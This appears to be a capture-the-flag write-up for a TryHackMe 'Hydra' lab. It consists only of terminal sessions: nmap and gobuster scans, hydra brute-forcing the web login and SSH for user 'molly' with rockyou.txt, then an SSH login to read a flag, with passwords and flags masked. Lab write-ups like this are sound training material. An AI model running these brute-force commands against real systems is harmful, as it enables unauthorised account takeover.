```
┌──(luf3㉿kali)-[~]
└─$ nmap -A 10.10.57.160

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:b1:e4:74:05:e3:55:81:41:2a:59:a6:62:09:23:d0 (RSA)
|   256 b1:d0:53:1c:15:28:77:b6:03:42:60:7e:d7:bd:87:2f (ECDSA)
|_  256 b9:2f:e7:47:a2:56:5d:db:0c:0d:df:80:81:63:56:23 (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Hydra Challenge
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
┌──(luf3㉿kali)-[~]
└─$ gobuster dir -u 10.10.57.160 -w wl/common.txt -t 100

/assets (Status: 301)
/css (Status: 301)
/img (Status: 301)
/js (Status: 301)
/login (Status: 200)
/Login (Status: 200)
```

```
┌──(luf3㉿kali)-[~]
└─$ hydra -l molly -P rockyou.txt 10.10.57.160 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect"

[80][http-post-form] host: 10.10.57.160   login: molly   password: *******


THM{*************************************}
```

```
┌──(luf3㉿kali)-[~]
└─$ hydra -l molly -P rockyou.txt 10.10.57.160 ssh

[22][ssh] host: 10.10.57.160   login: molly   password: ********
```

```
┌──(luf3㉿kali)-[~]
└─$ ssh molly@10.10.57.160 
```

```
molly@ip-10-10-57-160:~$ cat flag2.txt 
THM{************************************}
```